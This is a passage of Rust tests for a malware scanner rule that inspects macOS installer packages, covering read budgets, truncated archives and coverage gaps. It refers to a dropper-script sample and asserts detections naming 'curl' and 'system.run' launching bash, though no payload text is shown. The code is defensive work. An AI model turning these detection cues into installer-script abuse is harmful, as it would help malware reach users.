    fn a_held_gzip_past_its_cap_is_reported() {
        let cpio = [
            odc_member("payload.bin", &[0; 20_000]),
            odc_member("preinstall", SCRIPT_DROPPER),
            odc_member("TRAILER!!!", b""),
        ]
        .concat();
        let (signal, incomplete) = flat_scripts_blob(&zlib_stored(&gzip_member(&cpio)));
        let d = signal.expect("finding").description;
        assert_eq!(d, format!("{STARVED} (1 component)"));
        assert!(incomplete);
    }

    /// A stored `Scripts` is the gzip itself, decoded by the outer read: the
    /// held cap does not apply, however large it is.
    #[test]
    fn a_stored_scripts_past_the_held_cap_is_not_reported() {
        let blob = scripts_of(&[
            ("./Installer.dmg", &[0; 20_000]),
            ("./postinstall", b"#!/bin/sh\nexit 0\n"),
        ]);
        assert!(blob.len() > 4 * 4096);
        let (signal, incomplete) = flat_scripts_blob(&blob);
        assert!(signal.is_none(), "{signal:?}");
        assert!(incomplete);
    }

    /// A share stop counts as an overrun only when decoding, not the raw input
    /// alone, ran past the share: a large input is unreadable, not reported.
    #[test]
    fn a_share_stop_on_raw_input_alone_is_not_reported() {
        let run = |blob: &[u8]| {
            let limits = xar::XarLimits {
                max_entry_bytes: 4096,
                max_read_back_bytes: 40_000,
                ..xar::XarLimits::default()
            };
            let mut heap = Heap::default();
            let toc = file("Scripts", heap.add(blob));
            let (r, c) = evaluate_small(&archive(&toc, &heap), &limits);
            // `NotApplicable` is no finding and incomplete.
            let incomplete = r.is_err() || c.marked_incomplete("installer-script-suspicious");
            let d = r.ok().flatten().map(|s| s.description).unwrap_or_default();
            (d, incomplete)
        };
        // A stored 30 KB gzip: input over a lone entry's 20 KB share.
        let noise: Vec<u8> = (0..30_000u32).map(|i| (i * 7919 % 251) as u8).collect();
        let big = scripts_of(&[("./data.bin", &noise), ("./postinstall", b"exit 0\n")]);
        assert!(big.len() > 20_000);
        let (d, incomplete) = run(&big);
        assert!(!d.contains(STARVED), "{d}");
        assert!(incomplete);
        // A small gzip whose empty blocks' decode work runs past the share.
        let cpio = [
            odc_member("./preinstall", SCRIPT_DROPPER),
            odc_member("TRAILER!!!", b""),
        ]
        .concat();
        let n = u16::try_from(cpio.len()).expect("one block");
        let mut gz = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
        // Four empty fixed-Huffman blocks per five bytes.
        gz.extend([0x02, 0x08, 0x20, 0x80, 0x00].repeat(1000));
        gz.push(0b001);
        gz.extend_from_slice(&n.to_le_bytes());
        gz.extend_from_slice(&(!n).to_le_bytes());
        gz.extend_from_slice(&cpio);
        gz.extend_from_slice(&crate::inflate::crc32(&cpio).to_le_bytes());
        gz.extend_from_slice(&(cpio.len() as u32).to_le_bytes());
        assert!(gz.len() < 20_000);
        let (d, incomplete) = run(&gz);
        assert!(d.contains(STARVED), "{d}");
        assert!(incomplete);
        // Junk after it, past the share, is not stream input.
        gz.extend_from_slice(&[0x55; 30_000]);
        let (d, incomplete) = run(&gz);
        assert!(d.contains(STARVED), "{d}");
        assert!(incomplete);
    }

    /// A bzip2 `Scripts` is still cut at the entry cap, and that is reported.
    #[test]
    fn a_bzip2_scripts_cut_at_the_entry_cap_is_reported() {
        let pkg = include_bytes!(
            "../../fixtures/suspicious/installer_scripts_bzip2_preinstall_behind_large_member.pkg"
        );
        let (r, c) = evaluate_small(pkg, &xar::XarLimits::default());
        let d = r.expect("runs").expect("finding").description;
        assert_eq!(d, format!("{STARVED} (1 component)"));
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// A product archive whose components hold `blobs` as their `Scripts`, all
    /// named by its `Distribution` if `reachable`, else none.
    fn components_archive(blobs: &[Vec<u8>], reachable: bool) -> Vec<u8> {
        let names: Vec<String> = (0..blobs.len()).map(|i| format!("#c{i}.pkg")).collect();
        let refs: Vec<&str> = if reachable {
            names.iter().map(String::as_str).collect()
        } else {
            Vec::new()
        };
        let mut heap = Heap::default();
        let mut toc = file("Distribution", heap.add(&distribution_xml(&refs)));
        for (i, blob) in blobs.iter().enumerate() {
            toc += &nested(&format!("c{i}.pkg"), file("Scripts", heap.add(blob)));
        }
        archive(&toc, &heap)
    }

    const STARVED: &str = "scripts Installer runs exceed the read budget";

    #[test]
    fn reachable_components_over_the_budget_are_reported_once() {
        let limits = padding_limits();
        let blobs = vec![benign_scripts(1000); 12];
        // An equal share of what the Distribution leaves cannot read one.
        let share = limits.max_read_back_bytes / 12;
        assert!(3 * blobs[0].len() > share);
        let (r, c) = evaluate_small(&components_archive(&blobs, true), &limits);
        let signal = r.expect("rule runs").expect("finding");
        assert_eq!(signal.weight, INSTALLER_SCRIPTS_STARVED_WEIGHT);
        assert_eq!(signal.description, format!("{STARVED} (12 components)"));
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    #[test]
    fn unreachable_components_over_the_budget_are_not_reported() {
        let blobs = vec![benign_scripts(1000); 12];
        let (r, _) = evaluate_small(&components_archive(&blobs, false), &padding_limits());
        assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
    }

    #[test]
    fn untrusted_references_report_a_starved_scripts_in_any_group() {
        let limits = padding_limits();
        let pads = starving_padding(&limits);
        let comps = [("comp.pkg", "preinstall")];
        // An escaped '/' voids the whole reference set.
        let (d, incomplete) = found(
            &product(&["#comp.pkg", "#a%2Fb.pkg"], &comps, pads),
            &limits,
        );
        assert!(d.expect("starved").starts_with(STARVED));
        assert!(incomplete);
        // Trusted but unreferenced: Installer does not run it.
        let (d, _) = found(&product(&[], &comps, pads), &limits);
        assert_eq!(d, None);
    }

    #[test]
    fn reachable_components_that_fit_are_not_reported() {
        let limits = padding_limits();
        let blobs = vec![benign_scripts(1000); 2];
        let (r, _) = evaluate_small(&components_archive(&blobs, true), &limits);
        assert!(matches!(r, Ok(None)), "{r:?}");
    }

    /// A corrupt `Scripts`, or a large member that is not a script, is
    /// unreadable but not reported.
    #[test]
    fn a_scripts_cut_by_corruption_or_a_large_member_is_not_reported() {
        let limits = xar::XarLimits {
            max_entry_bytes: 4096,
            max_read_back_bytes: 1 << 20,
            ..xar::XarLimits::default()
        };
        let mut truncated = benign_scripts(1000);
        truncated.truncate(truncated.len() - 100);
        let large = scripts_of(&[
            ("payload.bin", &[b'x'; 8000][..]),
            ("preinstall", b"exit 0\n"),
        ]);
        for odd in [large, truncated] {
            let blobs = [benign_scripts(1000), odd];
            let (r, _) = evaluate_small(&components_archive(&blobs, true), &limits);
            assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
        }
    }

    /// Components whose shares stop their `Scripts` before the cpio trailer
    /// are reported (#112, #123).
    #[test]
    fn starved_components_are_reported() {
        let limits = xar::XarLimits {
            max_entry_bytes: 4096,
            max_read_back_bytes: 1 << 20,
            ..xar::XarLimits::default()
        };
        let blobs = [benign_scripts(1000), benign_scripts(8000)];
        let (r, c) = evaluate_small(&components_archive(&blobs, true), &limits);
        let signal = r.expect("runs").expect("finding");
        assert_eq!(signal.description, format!("{STARVED} (2 components)"));
        assert!(c.marked_incomplete("installer-script-suspicious"));
    }

    /// Each of the fixture's `Scripts` reads clean on its own budget, through
    /// to its `preinstall`; under one shared budget a share runs out first.
    #[test]
    fn the_starved_components_fixture_is_cut_only_by_sharing() {
        let pkg = include_bytes!(
            "../../fixtures/suspicious/installer_reachable_components_exceed_budget.pkg"
        );
        let limits = xar::XarLimits::default();
        let (r, c) = evaluate_small(pkg, &limits);
        let signal = r.expect("rule runs").expect("finding");
        assert_eq!(signal.description, format!("{STARVED} (2048 components)"));
        assert!(c.marked_incomplete("installer-script-suspicious"));

        let archive = xar::parse(pkg, &limits).expect("xar");
        let scripts: Vec<_> = archive
            .metadata_entries()
            .filter(|e| e.name == "Scripts")
            .collect();
        assert_eq!(scripts.len(), 2048);
        for entry in [scripts[0], scripts[2047]] {
            let mut sink = FirstBytes::default();
            let read = xar::ReadBudget::new(&limits)
                .read_entry_nested(&pkg[..], &archive, entry, &mut sink)
                .expect("reads");
            assert_eq!(read.gap, None);
            let members = cpio::parse(&sink.0, &cpio::CpioLimits::default()).expect("cpio");
            assert!(members.is_complete());
            assert!(members.entries.iter().any(|m| m.name == "preinstall"));
        }
    }

    /// Collects what a nested read sends to [`xar::NestedSink::first`].
    #[derive(Default)]
    struct FirstBytes(Vec<u8>);

    impl xar::NestedSink for FirstBytes {
        fn first(&mut self, bytes: &[u8]) {
            self.0.extend_from_slice(bytes);
        }

        fn later(&mut self, _: &[u8]) {}
    }

    // --- entries past the content read (#151) -----------------------------

    use crate::context::{MAX_CONTENT_BYTES, MAX_RANGE_READ};
    use crate::model::{CoverageGap, ScanCompleteness};

    /// Stored `Payload` bytes that push later entries past the content read.
    const PAD: usize = MAX_CONTENT_BYTES + (1 << 20);

    /// A TOC entry for heap bytes `[off, off + n)`.
    fn heap_entry(name: &str, off: u64, n: u64) -> String {
        format!(
            r#"<file><name>{name}</name><type>file</type><data><offset>{off}</offset><length>{n}</length><size>{n}</size></data></file>"#
        )
    }

    /// A pkg laid out as `pkgbuild` does: a stored, zero `Payload` of `pad`
    /// bytes first, then `tail`; `toc` describes `tail`'s entries.
    fn padded_pkg_with(pad: usize, toc: &str, tail: &[u8]) -> Vec<u8> {
        let toc = format!(
            "<?xml version=\"1.0\"?><xar><toc>{}{toc}</toc></xar>",
            heap_entry("Payload", 0, pad as u64)
        );
        let mut bytes = xar::xar_from_zlib_toc(&zlib_stored(toc.as_bytes()), toc.len() as u64);
        bytes.resize(bytes.len() + pad, 0);
        bytes.extend_from_slice(tail);
        bytes
    }

    /// [`padded_pkg_with`] `PAD` bytes, then each `(name, blob)` in order.
    fn padded_pkg(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut toc = String::new();
        let mut tail = Vec::new();
        for (name, blob) in entries {
            let off = (PAD + tail.len()) as u64;
            toc += &heap_entry(name, off, blob.len() as u64);
            tail.extend_from_slice(blob);
        }
        padded_pkg_with(PAD, &toc, &tail)
    }

    /// `bytes` loaded through a real file, as a scan sees it.
    fn load_pkg(bytes: &[u8]) -> ScanContext {
        let path = crate::test_support::write_temp_file("pkg151", bytes);
        let c = ScanContext::load(&path);
        let _ = std::fs::remove_file(&path);
        assert!(c.truncated);
        c
    }

    /// Bytes `c` read from disk past its content read.
    fn disk_read(c: &ScanContext) -> u64 {
        c.bytes_read() - MAX_CONTENT_BYTES as u64
    }

    /// Completeness and gaps of a scan of `c` with only the script rule.
    fn script_rule_coverage(c: &ScanContext) -> (ScanCompleteness, Vec<CoverageGap>) {
        let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
        let result = crate::scan::scan_context(c, &rules);
        (result.completeness, result.coverage_gaps)
    }

    fn clean_scripts() -> Vec<u8> {
        gzip_member(&cpio_one("preinstall", b"echo hi\n"))
    }

    fn dropper_scripts() -> Vec<u8> {
        gzip_member(&cpio_one("postinstall", SCRIPT_DROPPER))
    }

    fn same_signal(a: &MatchedSignal, b: &MatchedSignal) -> bool {
        (&a.id, a.weight, &a.description) == (&b.id, b.weight, &b.description)
    }

    #[test]
    fn a_suspicious_script_past_the_content_read_scores_as_in_memory() {
        let bytes = padded_pkg(&[("Scripts", &dropper_scripts())]);
        let disk = load_pkg(&bytes);
        let memory = ctx(&disk.path.to_string_lossy(), &bytes);
        let got = InstallerScriptRule
            .evaluate(&disk)
            .expect("ok")
            .expect("fires");
        let want = InstallerScriptRule
            .evaluate(&memory)
            .expect("ok")
            .expect("fires");
        assert!(same_signal(&got, &want), "{got:?} vs {want:?}");
        assert!(got.description.contains("curl"), "{}", got.description);
    }

    #[test]
    fn fully_read_metadata_in_a_truncated_pkg_leaves_only_the_truncated_gap() {
        let bytes = padded_pkg(&[("Scripts", &dropper_scripts())]);
        let c = load_pkg(&bytes);
        assert_eq!(
            script_rule_coverage(&c),
            (ScanCompleteness::Partial, vec![CoverageGap::Truncated])
        );
    }

    #[test]
    fn clean_scripts_past_the_content_read_are_clean_and_partial() {
        let c = load_pkg(&padded_pkg(&[("Scripts", &clean_scripts())]));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
        assert_eq!(
            script_rule_coverage(&c),
            (ScanCompleteness::Partial, vec![CoverageGap::Truncated])
        );
    }

    /// The probe's bytes are reused by the entry read, not fetched again.
    #[test]
    fn a_header_probe_and_its_entry_read_fetch_no_byte_twice() {
        let scripts = clean_scripts();
        let c = load_pkg(&padded_pkg(&[("Scripts", &scripts)]));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
        assert_eq!(disk_read(&c), scripts.len() as u64);
    }

    #[test]
    fn many_entries_sharing_one_heap_range_cost_one_probe_and_one_read() {
        let scripts = clean_scripts();
        let toc = heap_entry("Scripts", PAD as u64, scripts.len() as u64).repeat(3000);
        let bytes = padded_pkg_with(PAD, &toc, &scripts);
        let archive = xar::parse(&bytes, &xar::XarLimits::default()).expect("xar");
        assert_eq!(archive.files.len(), 3001);
        let c = load_pkg(&bytes);
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
        assert_eq!(disk_read(&c), scripts.len() as u64);
    }

    /// A probe is paid for before it is read; one that empties the
    /// allowance leaves nothing for the entry read.
    #[test]
    fn a_header_probe_the_allowance_cannot_cover_stops_the_entry() {
        let bytes = padded_pkg(&[("Scripts", &clean_scripts())]);
        for (budget, read) in [(8, 0), (16, 16)] {
            let limits = xar::XarLimits {
                max_read_back_bytes: budget,
                ..xar::XarLimits::default()
            };
            let c = load_pkg(&bytes);
            let r = InstallerScriptRule.evaluate_with(&c, &limits);
            assert!(
                matches!(r, Err(RuleOutcome::NotApplicable))
                    || c.marked_incomplete("installer-script-suspicious"),
                "{r:?}"
            );
            assert!(!matches!(r, Ok(None)));
            assert_eq!(disk_read(&c), read, "budget {budget}");
        }
    }

    /// One read past the content read is at most `MAX_RANGE_READ`; the rest
    /// of a longer entry is a gap, never clean, and not a starved signal.
    #[test]
    fn an_entry_over_the_range_read_cap_is_cut_and_not_applicable() {
        let big = MAX_RANGE_READ + (1 << 20);
        let toc =
            heap_entry("Payload", 0, PAD as u64) + &heap_entry("Scripts", PAD as u64, big as u64);
        let head = xar::toc_xar_bytes(&toc);
        let path =
            crate::test_support::sparse_temp_file("pkg151-big", (head.len() + PAD + big) as u64);
        crate::test_support::write_at(&path, 0, &head);
        let c = ScanContext::load(&path);
        let _ = std::fs::remove_file(&path);
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        assert_eq!(disk_read(&c), MAX_RANGE_READ as u64);
    }

    #[test]
    fn declared_ranges_past_eof_or_overflowing_are_not_applicable() {
        let max = u64::MAX;
        for (off, n) in [(PAD as u64, 100), (max, 1), (0, max), (PAD as u64, max)] {
            let c = load_pkg(&padded_pkg_with(PAD, &heap_entry("Scripts", off, n), b""));
            assert!(
                matches!(
                    InstallerScriptRule.evaluate(&c),
                    Err(RuleOutcome::NotApplicable)
                ),
                "{off}+{n}"
            );
            assert_eq!(disk_read(&c), 0, "{off}+{n}");
        }
    }

    /// An embedded capture has no file to read past what it holds.
    #[test]
    fn scripts_past_a_truncated_embedded_capture_are_not_applicable() {
        let scripts = dropper_scripts();
        let toc = heap_entry("Scripts", 1000, scripts.len() as u64);
        let bytes = padded_pkg_with(1000, &toc, &scripts);
        let heap_start = xar::parse(&bytes, &xar::XarLimits::default())
            .expect("xar")
            .heap_start as usize;
        let capture = bytes[..heap_start + 1010].to_vec();
        let c = ScanContext::from_embedded_bytes("outer.zip!inner.pkg", capture, true);
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
    }

    #[test]
    fn a_distribution_past_the_content_read_is_read_and_scored() {
        let product = pkg!("distribution_dropper");
        let archive = xar::parse(product, &xar::XarLimits::default()).expect("xar");
        let entry = archive
            .files
            .iter()
            .find(|f| f.name == "Distribution")
            .expect("Distribution");
        let dist = xar::read_entry(product, &archive, entry, &xar::XarLimits::default())
            .expect("readable");
        let bytes = padded_pkg(&[("Distribution", &dist)]);
        let disk = load_pkg(&bytes);
        let memory = ctx(&disk.path.to_string_lossy(), &bytes);
        let got = InstallerScriptRule
            .evaluate(&disk)
            .expect("ok")
            .expect("fires");
        let want = InstallerScriptRule
            .evaluate(&memory)
            .expect("ok")
            .expect("fires");
        assert!(same_signal(&got, &want), "{got:?} vs {want:?}");
        assert!(
            got.description
                .contains("system.run launches an interpreter (bash)"),
            "{}",
            got.description
        );
        assert_eq!(
            script_rule_coverage(&disk),
            (ScanCompleteness::Partial, vec![CoverageGap::Truncated])
        );
    }

    /// Everything read from disk, probes included, is charged to the
    /// archive's read-back budget.
    #[test]
    fn disk_reads_stay_within_the_read_back_budget() {
        let limits = xar::XarLimits {
            max_entry_bytes: 4096,
            max_read_back_bytes: 64 * 1024,
            ..xar::XarLimits::default()
        };
        let blob = vec![b'a'; 8 * 1024];
        let mut toc = String::new();
        let mut tail = Vec::new();
        for i in 0..40 {
            let name = if i % 4 == 0 {
                "Distribution"
            } else {
                "Scripts"
            };
            toc += &format!(
                "<file><name>c{i}</name><type>directory</type>{}</file>",
                heap_entry(name, (PAD + tail.len()) as u64, blob.len() as u64)
            );
            tail.extend_from_slice(&blob);
        }
        let c = load_pkg(&padded_pkg_with(PAD, &toc, &tail));
        let _ = InstallerScriptRule.evaluate_with(&c, &limits);
        let read = disk_read(&c);
        assert!(read > 0);
        assert!(read <= limits.max_read_back_bytes as u64, "{read}");
    }
}
